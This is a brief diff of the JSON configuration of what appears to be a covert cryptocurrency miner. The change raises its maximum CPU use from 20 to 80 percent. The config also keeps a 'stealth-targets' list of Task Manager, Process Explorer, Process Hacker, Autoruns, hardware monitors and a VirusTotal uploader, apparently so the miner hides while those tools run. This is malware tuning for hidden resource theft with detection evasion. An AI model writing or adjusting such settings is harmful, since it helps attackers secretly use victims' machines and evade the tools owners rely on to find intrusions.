@@ -6,7 +6,7 @@
     "password": "",
     "nicehash": false,
     "ssltls": true,
-    "max-cpu": 20,
+    "max-cpu": 80,
     "idle-wait": 5,
     "idle-cpu": 100,
     "stealth-targets": "Taskmgr.exe,SystemInformer.exe,ProcessHacker.exe,ProcessHacker32.exe,ProcessHacker64.exe,procexp.exe,procexp64.exe,procexp64a.exe,Perfmon.exe,perfmon.exe,SystemExplorer.exe,Autoruns.exe,OpenHardwareMonitor.exe,PCHunter32.exe,PCHunter64.exe,aida64.exe,HWiNFO64GPUZ.exe,GPU-Z.exe,MSIAfterburner.exe,AnVir.exe,virustotal-uploader-2-0-en-win.exe",
